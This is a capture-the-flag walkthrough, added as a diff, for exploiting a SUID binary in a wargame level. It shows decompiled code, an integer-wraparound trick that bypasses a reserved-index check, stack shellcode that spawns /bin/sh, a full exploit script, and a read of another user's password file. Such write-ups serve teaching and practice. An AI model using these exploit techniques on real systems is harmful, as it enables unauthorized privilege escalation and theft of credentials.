@@ -1,0 +1,302 @@
+# Nebula Level07 Walkthrough
+
+## Initial Enumeration
+
+After SSHing into `level07`, I started by enumerating the home directory.
+
+```bash
+$ ls -l
+
+-rwsr-s---+ 1 level08 users 11744 Sep 10 2016 level07
+```
+
+The binary has the SUID bit set, meaning it executes with the privileges of `level08`.
+
+The objective is to exploit this binary and obtain a shell as `level08`.
+
+Inspecting the binary:
+
+```bash
+$ file level07
+
+level07: ELF 32-bit LSB executable, Intel 80386, dynamically linked, stripped
+```
+
+Running it displays a simple number storage service.
+
+```text
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+```
+
+## Reverse Engineering
+
+After decompiling the binary, the interesting function is `store_number()`.
+
+```c
+int store_number(int data)
+{
+    unsigned int number;
+    unsigned int index;
+
+    printf(" Number: ");
+    number = get_unum();
+
+    printf(" Index: ");
+    index = get_unum();
+
+    if (index == 3 * (index / 3) || HIBYTE(number) == 183)
+    {
+        puts(" *** ERROR! ***");
+        puts("   This index is reserved for wil!");
+        puts(" *** ERROR! ***");
+
+        return 1;
+    }
+
+    *(unsigned int *)(data + 4 * index) = number;
+
+    return 0;
+}
+```
+
+At first glance, there are two protections:
+
+* Multiples of 3 are forbidden.
+* Numbers whose high byte equals `0xb7` are forbidden.
+
+The actual problem is much larger.
+
+There is **no bounds checking** on `index`.
+
+The program simply does:
+
+```c
+data[index] = number;
+```
+
+This gives us an arbitrary stack write primitive.
+
+---
+
+## Understanding the Stack Layout
+
+Inside `main()`:
+
+```c
+_BYTE data[400];
+```
+
+400 bytes correspond to 100 integers.
+
+The buffer is passed directly to `store_number()`.
+
+```c
+store_number((int)data);
+```
+
+By choosing a sufficiently large index, we can overwrite data beyond the array, including the saved return address.
+
+Using GDB, I determined that the saved return address is located at index `114`.
+
+Normally we would simply overwrite it.
+
+However:
+
+```text
+114 % 3 = 0
+```
+
+which triggers the protection.
+
+---
+
+## Bypassing the Reserved Index Check
+
+The vulnerable write is:
+
+```c
+*(data + 4 * index)
+```
+
+Since this is a 32-bit binary, arithmetic wraps around at `2^32`.
+
+Notice:
+
+```text
+4 × 2^30 = 2^32
+```
+
+Therefore:
+
+```text
+4 × (index + 2^30)
+
+= 4×index + 2^32
+
+= 4×index
+```
+
+The destination address remains unchanged.
+
+I created this helper function:
+
+```python
+def int_overflow(num):
+    return num + 2**30 if num % 3 == 0 else num
+```
+
+Instead of writing to index:
+
+```text
+114
+```
+
+I write to:
+
+```text
+114 + 1073741824
+```
+
+Now:
+
+```text
+(114 + 1073741824) % 3 = 1
+```
+
+The check is bypassed while the write still lands on the same memory location.
+
+---
+
+## Injecting Shellcode
+
+The storage buffer itself lives on the stack.
+
+Since the stack is executable in this challenge, I can simply place shellcode inside the buffer and redirect execution to it.
+
+I used a small `execve("/bin/sh")` shellcode.
+
+```python
+SHELLCODE = (
+    b"\x68\x2F\x73\x68\x00"
+    b"\x68\x2F\x62\x69\x6E"
+    b"\x6A\x0B"
+    b"\x58"
+    b"\x89\xE3"
+    b"\x31\xC9"
+    b"\x31\xD2"
+    b"\xCD\x80"
+)
+```
+
+I filled the rest of the storage buffer with NOPs.
+
+```python
+SHELLCODE = "\x90" * (400 - len(SHELLCODE)) + SHELLCODE
+```
+
+The shellcode address was:
+
+```python
+SHELLCODE_ADDR = 0xffffd5a0
+```
+
+---
+
+## Exploit Script
+
+```python
+import struct
+
+def int_overflow(num):
+    return num + 2**30 if num % 3 == 0 else num
+
+SHELLCODE = b"\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x6A\x0B\x58\x89\xE3\x31\xC9\x31\xD2\xCD\x80"
+
+SHELLCODE = "\x90" * (400 - len(SHELLCODE)) + SHELLCODE
+
+SHELLCODE_ADDR = 0xffffd5a0
+
+exploit = ""
+
+# Overwrite saved return address
+exploit += "store\n"
+exploit += str(SHELLCODE_ADDR) + "\n"
+exploit += str(int_overflow(114)) + "\n"
+
+store_index = 0
+
+# Fill storage buffer with shellcode
+for i in xrange(0, len(SHELLCODE), 4):
+
+    exploit += "store\n"
+
+    exploit += str(
+        struct.unpack("I", SHELLCODE[i:i+4])[0]
+    ) + "\n"
+
+    exploit += str(
+        int_overflow(store_index)
+    ) + "\n"
+
+    store_index += 1
+
+exploit += "quit\n"
+
+print exploit
+```
+
+Execute it:
+
+```bash
+$ python exploit.py | ./level07
+```
+
+Once `main()` returns, execution jumps to our shellcode.
+
+Since the binary is SUID, the spawned shell runs as `level08`.
+
+Verify it:
+
+```bash
+$ whoami
+
+level08
+```
+
+Retrieve the password:
+
+```bash
+$ cat /home/level08/.pass
+```
+
+## Key Takeaways
+
+The exploitation chain is:
+
+1. Unbounded array indexing → arbitrary stack write
+2. Weak protection (`index % 3 == 0`)
+3. Integer overflow bypass using `2^30`
+4. Overwrite the saved return address
+5. Execute shellcode from the stack
+6. Obtain a shell as `level08`
+
+The most interesting part of this challenge is the arithmetic trick:
+
+```text
+4 × (index + 2^30)
+
+= 4×index + 2^32
+
+= 4×index
+```
+
+which completely defeats the author's attempt to reserve certain indices.
